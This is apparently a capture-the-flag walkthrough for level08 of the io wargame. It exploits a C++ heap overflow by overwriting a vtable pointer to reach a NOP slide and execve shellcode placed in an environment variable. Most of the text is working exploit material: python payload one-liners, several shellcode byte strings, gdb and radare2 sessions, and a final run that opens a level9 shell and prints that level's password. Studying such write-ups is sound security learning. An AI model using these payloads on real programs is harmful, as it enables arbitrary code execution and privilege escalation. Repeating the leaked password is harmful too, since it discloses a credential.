
```
$ export NOP_AND_SHELLCODE=$(python -c "print '\x90' * 130000")$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")

(gdb) run $(python -c "print 'A' * 108 + '\xde\xad\xbe\xef'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /levels/level08 $(python -c "print 'A' * 108 + '\xde\xad\xbe\xef'")

Breakpoint 1, 0x08048697 in main ()
(gdb) x/s *((char **)environ)
0xbffe024e:	"XDG_SESSION_ID=299954"
(gdb) x/4w 0xbffe0afe
0xbffe0afe:	U'\x90909090' <repeats 200 times>...
0xbffe0e1e:	U'\x90909090' <repeats 200 times>...
0xbffe113e:	U'\x90909090' <repeats 200 times>...
0xbffe145e:	U'\x90909090' <repeats 200 times>...


```
We can overwrite the `virtual int operator+` during the `five.setAnnotation(argv[1]);` call so that when `return six + five;` happens, it jumps to our method instead.

It looks like we can't just throw the location of our environment variable NOP slide + shellcode because of:
```
|           0x56603274      e8c7000000     call sym.Number::setAnnotation_char ;[3]                                                                                                     
|           0x56603279      83c410         add esp, 0x10                                                                                                                                |           0x5660327c      8b45d8         mov eax, dword [local_28h]                                                                                                                   
|           0x5660327f      8b00           mov eax, dword [eax]                                                                                                                         
|           ;-- eip:                                                                                                                                                                    |           0x56603281      8b00           mov eax, dword [eax]                                                                                                                         
|           0x56603283      83ec08         sub esp, 8                                                                                                                                   
|           0x56603286      ff75dc         push dword [local_24h]                                                                                                                       |           0x56603289      ff75d8         push dword [local_28h]                                                                                                                       
|           0x5660328c      ffd0           call eax                           
```
It looks a lot like the `mov eax, dword [eax]` means that `eax` must be overwritten with an address in the heap (somewhere we can actually write to). Otherwise, attempting to write to the location where `eax` points (say in static section or elsewhere) will cause a segmentation fault.

So we want to overwrite the heap with enough padding to overwrite the function pointer, then a BUNCH of NOPs and then our shellcode 
`0xbffe022a` is definitely not in the heap...
seems like it could be a location in the heap where we could jump to
`0x0804eae0` is in the heap, but ???ebp-0x2

You need to overwrite the pointer to the class' vtable, and then write the address of your NOP+shellcode to the location that your pointer points to
level8@io:~$ r2 -d /levels/level08 $(python -c "print 'A' * 108 + '\xe0\xea\x04\x08' + '\x5e\x14\xfe\xbf' * 1024")

$(python -c "print 'A' * 108 + '\xe0\xea\x04\x08' + '\x5e\x14\xfe\xbf' * 1024")

new attempt at shellcode:
```
python -c "print '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80'"
```

WIN:
```
level8@io:~$ export NOP_AND_SHELLCODE=$(python -c "print '\x90' * 1024 + '\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'")
level8@io:~$ /levels/level08 $(python -c "print 'A' * 108 + '\xe0\xea\x04\x08' + '\x3e\xfd\xff\xbf' * 1024")
sh-4.3$ id
uid=1008(level8) gid=1008(level8) euid=1009(level9) groups=1008(level8),1029(nosu)
sh-4.3$ whoami
level9
sh-4.3$ cat /home/level9/.pass
ise9uHhjOhZd0K4G
```

Issue was just with shellcode. using the original aleph one shellcode worked :tada:
https://insecure.org/stf/smashstack.html
